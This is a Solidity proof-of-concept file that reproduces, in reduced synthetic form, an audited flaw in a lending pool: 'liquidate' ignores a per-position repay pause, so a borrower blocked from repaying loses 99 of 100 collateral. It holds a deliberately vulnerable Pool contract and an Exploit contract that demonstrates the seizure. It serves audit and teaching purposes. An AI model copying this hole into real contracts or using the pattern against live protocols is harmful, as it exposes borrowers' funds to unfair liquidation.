// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Cedro Finance — repayPause blocks repayRequest, liquidate does not check it
    (Zokyo, 2024-03-19 Cedro Finance, high).

    SYNTHETIC, cheatcode-free reduction. A position with 100 collateral and
    90 debt is underwater at an 80% LTV. Repaying 20 would drop the debt to
    70 and put it back above water. repayPause[id] makes that repay revert.
    liquidate does not read repayPause, so a liquidator seizes 99 collateral
    (debt plus a 10% bonus). The control leaves repay open: the 20 repay
    succeeds and liquidate reverts. */

error ProtocolPaused(string tag);
error DepositPaused(string tag, bytes32 id);

contract Token {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pool {
    string public constant TAG = "CORE";
    uint256 private locked;

    Token public col;
    Token public debtToken;
    address public owner;
    bool public protocolPause;
    mapping(bytes32 => bool) public repayPause;
    mapping(bytes32 => uint256) public collateralOf;
    mapping(bytes32 => uint256) public debtOf;
    mapping(bytes32 => address) public borrowerOf;

    modifier nonReentrant() {
        require(locked == 0, "reentrancy");
        locked = 1;
        _;
        locked = 0;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    constructor(Token col_, Token debt_) {
        col = col_;
        debtToken = debt_;
        owner = msg.sender;
    }

    function seed(bytes32 id, address borrower, uint256 collateral, uint256 debt) external onlyOwner {
        require(collateralOf[id] == 0, "seeded");
        collateralOf[id] = collateral;
        debtOf[id] = debt;
        borrowerOf[id] = borrower;
        col.mint(address(this), collateral);
    }

    function setRepayPause(bytes32 id, bool paused) external onlyOwner {
        repayPause[id] = paused;
    }

    function repayRequest(bytes32 id, uint256 amount, bytes32 route, uint256 airdropAmount)
        external
        payable
        nonReentrant
    {
        if (protocolPause) revert ProtocolPaused(TAG);
        if (repayPause[id]) revert DepositPaused(TAG, id);
        require(msg.sender == borrowerOf[id], "borrower");
        require(amount <= debtOf[id], "amount");
        route;
        airdropAmount;
        debtToken.transferFrom(msg.sender, address(this), amount);
        debtOf[id] -= amount;
    }

    function liquidate(bytes32 id) external returns (uint256 seized) {
        uint256 debt = debtOf[id];
        uint256 collateral = collateralOf[id];
        require(collateral != 0 && debt != 0, "empty");
        // @> VULN: repayPause[id] is not checked, so liquidation runs while repay is paused
        require(debt * 100 > collateral * 80, "healthy");
        seized = debt * 110 / 100;
        if (seized > collateral) seized = collateral;
        collateralOf[id] = collateral - seized;
        debtOf[id] = 0;
        col.transfer(msg.sender, seized);
    }
}

contract Borrower {
    Token public debtToken;
    Pool public pool;

    constructor(Token debt_, Pool pool_) {
        debtToken = debt_;
        pool = pool_;
    }

    function fundAndApprove(uint256 amount) external {
        debtToken.mint(address(this), amount);
        debtToken.approve(address(pool), amount);
    }

    function tryRepay(bytes32 id, uint256 amount) external returns (bool ok) {
        try pool.repayRequest(id, amount, bytes32(0), 0) {
            ok = true;
        } catch {
            ok = false;
        }
    }
}

contract Exploit {
    bytes32 public constant ID = bytes32("loan");
    uint256 public constant COLLATERAL = 100 ether;
    uint256 public constant DEBT = 90 ether;
    uint256 public constant REPAY = 20 ether;
    uint256 public constant SEIZED = 99 ether;

    Token public col;
    Token public debtToken;
    Pool public pool;
    Borrower public borrower;
    bool public repayOk;
    uint256 public seized;

    constructor() {
        col = new Token();
        debtToken = new Token();
        pool = new Pool(col, debtToken);
        borrower = new Borrower(debtToken, pool);
    }

    function run() external {
        pool.seed(ID, address(borrower), COLLATERAL, DEBT);
        pool.setRepayPause(ID, true);
        borrower.fundAndApprove(REPAY);
        repayOk = borrower.tryRepay(ID, REPAY);
        seized = pool.liquidate(ID);
        require(repayOk == false, "repay");
        require(pool.repayPause(ID), "paused");
        require(seized == SEIZED, "seized");
        require(col.balanceOf(address(this)) == SEIZED, "liquidator");
        require(pool.collateralOf(ID) == 1 ether, "left");
        require(debtToken.balanceOf(address(borrower)) == REPAY, "unspent");
    }
}
